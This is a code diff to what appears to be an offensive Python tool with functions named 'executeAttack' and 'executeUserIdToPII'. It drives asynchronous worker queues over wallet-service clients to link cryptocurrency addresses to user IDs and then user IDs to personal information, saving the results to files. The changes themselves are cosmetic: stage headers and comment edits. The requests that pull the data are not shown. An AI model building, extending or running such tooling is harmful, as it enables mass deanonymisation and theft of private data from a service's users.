@@ -11,6 +11,11 @@ from parse import getDataFilePath, read_addresses, read_processed_addresses, rea
 
 logger = logging.getLogger(__name__)
 
+
+#################################################
+###       STAGE 2 - ADDRESSES <> USER ID      ###
+#################################################
+
 lock = asyncio.Lock()
 
 async def queue_worker(name: int, queue: asyncio.Queue, clients: list[CWalletClient], amount: str, coin: CryptoCoin, writer):
@@ -46,13 +51,13 @@ async def executeAttack(addressesFileName: str, resultsFileName: str, clients: l
     addresses_file = getDataFilePath(addressesFileName)
     results_file = getDataFilePath(resultsFileName)
 
-    # 1️⃣ Read already processed
+    # Read already processed
     processed_addresses = read_processed_addresses(results_file)
 
-    # 2️⃣ Read all addresses
+    # Read all addresses
     all_addresses = read_addresses(addresses_file)
 
-    # 3️⃣ Subtract (Method 3 – ordered filtering with set)
+    # Subtract (Method 3 – ordered filtering with set)
     remaining_addresses = [
         addr for addr in all_addresses
         if addr not in processed_addresses
@@ -66,7 +71,7 @@ async def executeAttack(addressesFileName: str, resultsFileName: str, clients: l
         print("Nothing to process.")
         return
 
-    # 4️⃣ Open results file in append mode
+    # Open results file in append mode
     file_exists = results_file.exists()
 
     async with aiofiles.open(results_file, mode="a", newline="") as afp:
@@ -103,7 +108,7 @@ async def executeAttack(addressesFileName: str, resultsFileName: str, clients: l
 
 
 #################################################
-###           USER ID DATA EXTRACTION         ###
+###          STAGE 3 - USER ID <> PII         ###
 #################################################
 
 lock_userId = asyncio.Lock()
@@ -144,13 +149,13 @@ async def executeUserIdToPII(userIdsFileName: str, resultsFileName: str, clients
     userIds_file = getDataFilePath(userIdsFileName)
     results_file = getDataFilePath(resultsFileName)
 
-    # 1️⃣ Read already processed
+    # Read already processed
     processed_userIds = read_processed_addresses(results_file)
 
-    # 2️⃣ Read all userIds rows
+    # Read all userIds rows
     all_userId_rows = read_userIds_rows(userIds_file)
 
-    # 3️⃣ Subtract (Method 3 – ordered filtering with set)
+    # Subtract (Method 3 – ordered filtering with set)
     remaining_userId_rows = [
         userId_row for userId_row in all_userId_rows
         if userId_row["address"] not in processed_userIds
@@ -164,7 +169,7 @@ async def executeUserIdToPII(userIdsFileName: str, resultsFileName: str, clients
         print("Nothing to process.")
         return
 
-    # 4️⃣ Open results file in append mode
+    # Open results file in append mode
     file_exists = results_file.exists()
 
     async with aiofiles.open(results_file, mode="a", newline="") as afp:
@@ -182,7 +187,7 @@ async def executeUserIdToPII(userIdsFileName: str, resultsFileName: str, clients
         for userId_row in remaining_userId_rows:
             queue.put_nowait(userId_row)
 
-        NUM_WORKERS =len(clients) * 1  # tune this
+        NUM_WORKERS =len(clients) * 1
 
         workers = [
             asyncio.create_task(
